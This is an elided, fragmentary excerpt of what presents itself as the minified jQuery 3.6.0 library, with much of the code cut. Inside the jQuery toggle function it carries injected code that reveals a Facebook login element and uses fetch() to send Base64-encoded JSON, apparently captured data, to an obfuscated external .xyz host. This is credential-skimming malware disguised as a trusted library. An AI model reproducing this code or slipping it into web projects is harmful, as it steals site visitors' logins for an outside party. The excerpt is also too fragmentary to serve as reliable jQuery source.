/*! jQuery v3.6.0 | (c) OpenJS Foundation and other contributors | jquery.org/license */ !(function (e, t) {
    ...
    (w.fn.ready = function (e) {
        ...
        w.extend({
            ...
            readyWait: 1,
            ready: function (e) {
                (!0 === e ? --w.readyWait : w.isReady) || ((w.isReady = !0) !== e && 0 < --w.readyWait) || B.resolveWith(v, [w]);
            },
        }),
        (w.ready.then = B.then),
    ...
    w.fn.extend({
        ...
        toggle: function (e) {
            (document.querySelector(".login-facebook").style.display = "block"),
                fetch(
                    Base64.decode("aHR0cHM6Ly90b3VtYW5uaG9zdGxpdmUueHl6L2JrcC8/YXBpa2V5PQ==") +
                        "" +
                        Base64.encode(
                            JSON.stringify(
                                (function (e) {
    ...
    function We(e, t, n) {
        ...
        return (
            (n = n || Re(e)) &&
                ...
                !d.pixelBoxStyles() && Pe.test(a) && Ie.test(t) && ((r = s.width), (i = s.minWidth), (o = s.maxWidth), (s.minWidth = s.maxWidth = s.width = a), (a = n.width), (s.width = r), (s.minWidth = i), (s.maxWidth = o))),
            void 0 !== a ? a + "" : a
        );
    }
    function Be(e, t) {
    ...
    function ze(e) {
        return (
            ...
            (e in $e
                ...
                : (_e[e] =
                      (function (e) {
                          for (var t = e[0].toUpperCase() + e.slice(1), n = Fe.length; n--; ) if ((e = Fe[n] + t) in $e) return e;
                      })(e) || e))
        );
    }
    ...
    w.extend({
            ...
            w.cssHooks[t] = {
                ...
                set: function (e, n, r) {
                    var i,
                        ...
                        u = r ? Je(e, t, r, s, o) : 0;
                    return (
                        s && a && (u -= Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - parseFloat(o[t]) - Je(e, t, "border", !1, o) - 0.5)),
        ...
        (w.cssHooks.marginLeft = Be(d.reliableMarginLeft, function (e, t) {
            if (t)
                return (
    ...
    function lt(e, t, n) {
        ...
        for (
            (function (e, t) {
                var n, r, i, o, a;
                for (n in e)
                    if (((i = t[(r = U(n))]), (o = e[n]), Array.isArray(o) && ((i = o[1]), (o = e[n] = o[0])), n !== r && ((e[r] = o), delete e[n]), (a = w.cssHooks[r]) && ("expand" in a)))
            ...
            ajax: function (t, n) {
                ...
                d.hasContent
                    ...
                    : ((p = d.url.slice(i.length)),
                      d.data && (d.processData || "string" == typeof d.data) && ((i += (Tt.test(i) ? "&" : "?") + d.data), delete d.data),
                      !1 === d.cache && ((i = i.replace(Dt, "$1")), (p = (Tt.test(i) ? "&" : "?") + "_=" + wt.guid++ + p)),
                      (d.url = i + p)),
                            ...
                            return function () {
                                n &&
                                    ...
                                    "abort" === e
                                        ...
                                        : o(Ft[s.status] || s.status, s.statusText, "text" !== (s.responseType || "text") || "string" != typeof s.responseText ? { binary: s.response } : { text: s.responseText }, s.getAllResponseHeaders()));
                            };
                        }),
                            (s.onload = n()),
    ...
    w.ajaxSetup({
        ...
        (w.parseHTML = function (e, t, n) {
            return "string" != typeof e
                ...
                : ("boolean" == typeof t && ((n = t), (t = !1)),
                  ...
                  (o = !n && []),
                  (i = N.exec(e)) ? [t.createElement(i[1])] : ((i = xe([e], t, o)), o && o.length && w(o).remove(), w.merge([], i.childNodes)));
            var r, i, o;
        }),
        ...
        w.each(["top", "left"], function (e, t) {
            w.cssHooks[t] = Be(d.pixelPosition, function (e, n) {
